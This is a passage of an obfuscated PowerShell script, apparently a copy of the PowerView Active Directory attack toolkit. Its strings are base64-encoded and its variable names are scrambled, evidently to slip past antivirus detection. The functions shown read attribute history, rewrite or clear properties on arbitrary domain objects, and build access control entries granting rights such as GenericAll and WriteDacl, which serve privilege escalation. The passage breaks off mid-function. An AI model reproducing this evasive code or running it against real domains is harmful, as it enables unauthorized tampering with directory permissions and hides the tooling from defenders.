                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAGEAdAB0AHIAaQBiAHUAdABlAG0AZQB0AGEAZABhAHQAYQAnACAAZgBvAHIAIAAnACQAewBfAC8AXABfAC8APQBcAF8AXwBfAF8ALwA9AD0APQBcAC8AfQAnAA==')))
                }
            }
        }
    }
}
function Get-DomainObjectLinkedAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${_/\__/\_/=\__/=\_} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${_/\__/\_/=\__/=\_} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        _____/\/==\/\_/=== @_/\/\/\/\___/\/\/ | % {
            ${_/\_/=\____/===\/} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${___/=\_/\/\__/\_/} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${_/\/==\/=\___/\/=} = [xml]${___/=\_/\/\__/\_/} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${_/\/==\/=\___/\/=}) {
                    if (${_/\/==\/=\___/\/=}.pszAttributeName -Match ${_/\__/\_/=\__/=\_}) {
                        ${/===\______/\/==\} = New-Object PSObject
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${_/\_/=\____/===\/}
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${_/\/==\/=\___/\/=}.pszAttributeName
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAVgBhAGwAdQBlAA=='))) ${_/\/==\/=\___/\/=}.pszObjectDn
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBDAHIAZQBhAHQAZQBkAA=='))) ${_/\/==\/=\___/\/=}.ftimeCreated
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${_/\/==\/=\___/\/=}.ftimeDeleted
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${_/\/==\/=\___/\/=}.ftimeLastOriginatingChange
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${_/\/==\/=\___/\/=}.dwVersion
                        ${/===\______/\/==\} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${_/\/==\/=\___/\/=}.pszLastOriginatingDsaDN
                        ${/===\______/\/==\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQATABpAG4AawBlAGQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${/===\______/\/==\}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEwAaQBuAGsAZQBkAEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAHYAYQBsAHUAZQBtAGUAdABhAGQAYQB0AGEAJwAgAGYAbwByACAAJwAkAHsAXwAvAFwAXwAvAD0AXABfAF8AXwBfAC8APQA9AD0AXAAvAH0AJwA=')))
                }
            }
        }
    }
}
function Set-DomainObject {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{'Raw' = $True}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ${/===\/\/\_/==\__/} = _____/\/==\/\_/=== @_/\/\/\/\___/\/\/
        ForEach ($Object in ${/===\/\/\_/==\__/}) {
            ${/=\/\___/=\/=\/==} = ${/===\/\/\_/==\__/}.GetDirectoryEntry()
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))].GetEnumerator() | % {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$(${/===\/\/\_/==\__/}.Properties.samaccountname)'"
                        ${/=\/\___/=\/=\/==}.put($_.Name, $_.Value)
                    }
                    ${/=\/\___/=\/=\/==}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$(${/===\/\/\_/==\__/}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))].GetEnumerator() | % {
                        ${______/\/==\/\__/} = $_.Name
                        ${/=\/==\__/\/==\__} = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '${______/\/==\/\__/}' with '${/=\/==\__/\/==\__}' for object '$(${/===\/\/\_/==\__/}.Properties.samaccountname)'"
                        ${___/\____/=\_/\_/} = ${/=\/\___/=\/=\/==}.${______/\/==\/\__/}[0].GetType().name
                        ${_/\__/\_/=\/=\___} = $(${/=\/\___/=\/=\/==}.${______/\/==\/\__/}) -bxor ${/=\/==\__/\/==\__}
                        ${/=\/\___/=\/=\/==}.${______/\/==\/\__/} = ${_/\__/\_/=\/=\___} -as ${___/\____/=\_/\_/}
                    }
                    ${/=\/\___/=\/=\/==}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$(${/===\/\/\_/==\__/}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))] | % {
                        ${______/\/==\/\__/} = $_
                        Write-Verbose "[Set-DomainObject] Clearing '${______/\/==\/\__/}' for object '$(${/===\/\/\_/==\__/}.Properties.samaccountname)'"
                        ${/=\/\___/=\/=\/==}.${______/\/==\/\__/}.clear()
                    }
                    ${/=\/\___/=\/=\/==}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$(${/===\/\/\_/==\__/}.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function ConvertFrom-LDAPLogonHours {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )
    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAEgAbwB1AHIAcwBBAHIAcgBhAHkAIABpAHMAIAB0AGgAZQAgAGkAbgBjAG8AcgByAGUAYwB0ACAAbABlAG4AZwB0AGgA')))
        }
        function _/=====\____/\___/ {
            Param (
                [int[]]
                ${__/==\/\__/\/=\/==}
            )
            ${/==\__________/==} = New-Object bool[] 24
            for(${_/\/\__/=\/==\/\_}=0; ${_/\/\__/=\/==\/\_} -lt 3; ${_/\/\__/=\/==\/\_}++) {
                ${___/\/\/===\/\/\_} = ${__/==\/\__/\/=\/==}[${_/\/\__/=\/==\/\_}]
                ${_/=\/\_/\/=\_____/} = ${_/\/\__/=\/==\/\_} * 8
                ${/=\_/=====\__/\/\} = [Convert]::ToString(${___/\/\/===\/\/\_},2).PadLeft(8,'0')
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+0] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[7])
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+1] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[6])
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+2] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[5])
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+3] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[4])
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+4] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[3])
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+5] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[2])
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+6] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[1])
                ${/==\__________/==}[${_/=\/\_/\/=\_____/}+7] = [bool] [convert]::ToInt32([string]${/=\_/=====\__/\/\}[0])
            }
            ${/==\__________/==}
        }
    }
    Process {
        ${/===\______/\/==\} = @{
            Sunday = _/=====\____/\___/ -__/==\/\__/\/=\/== $LogonHoursArray[0..2]
            Monday = _/=====\____/\___/ -__/==\/\__/\/=\/== $LogonHoursArray[3..5]
            Tuesday = _/=====\____/\___/ -__/==\/\__/\/=\/== $LogonHoursArray[6..8]
            Wednesday = _/=====\____/\___/ -__/==\/\__/\/=\/== $LogonHoursArray[9..11]
            Thurs = _/=====\____/\___/ -__/==\/\__/\/=\/== $LogonHoursArray[12..14]
            Friday = _/=====\____/\___/ -__/==\/\__/\/=\/== $LogonHoursArray[15..17]
            Saturday = _/=====\____/\___/ -__/==\/\__/\/=\/== $LogonHoursArray[18..20]
        }
        ${/===\______/\/==\} = New-Object PSObject -Property ${/===\______/\/==\}
        ${/===\______/\/==\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ASABvAHUAcgBzAA=='))))
        ${/===\______/\/==\}
    }
}
function New-ADObjectAccessControlEntry {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,
        [Guid]
        $InheritedObjectType
    )
    Begin {
        if ($PrincipalIdentity -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
            ${_/=\/\/=\_/=\_/==} = @{
                'Identity' = $PrincipalIdentity
                'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/=\/\/=\_/=\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${/=\_/=\/=\/===\/=} = _____/\/==\/\_/=== @_/=\/\/=\_/=\_/==
            if (-not ${/=\_/=\/=\/===\/=}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
            }
            elseif(${/=\_/=\/=\/===\/=}.Count -gt 1) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5ACAAbQBhAHQAYwBoAGUAcwAgAG0AdQBsAHQAaQBwAGwAZQAgAEEARAAgAG8AYgBqAGUAYwB0AHMALAAgAGIAdQB0ACAAbwBuAGwAeQAgAG8AbgBlACAAaQBzACAAYQBsAGwAbwB3AGUAZAA=')))
            }
            ${/===\_/\_/\_/=\__} = ${/=\_/=\/=\/===\/=}.objectsid
        }
        else {
            ${/===\_/\_/\_/=\__} = $PrincipalIdentity
        }
        ${/==\__/\__/\/\_/\} = 0
        foreach(${__/==\__/=====\/=} in $Right) {
            ${/==\__/\__/\/\_/\} = ${/==\__/\__/\/\_/\} -bor (([System.DirectoryServices.ActiveDirectoryRights]${__/==\__/=====\/=}).value__)
        }
        ${/==\__/\__/\/\_/\} = [System.DirectoryServices.ActiveDirectoryRights]${/==\__/\__/\/\_/\}
        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${/===\_/\_/\_/=\__})
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AFIAdQBsAGUAVAB5AHAAZQA=')))) {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
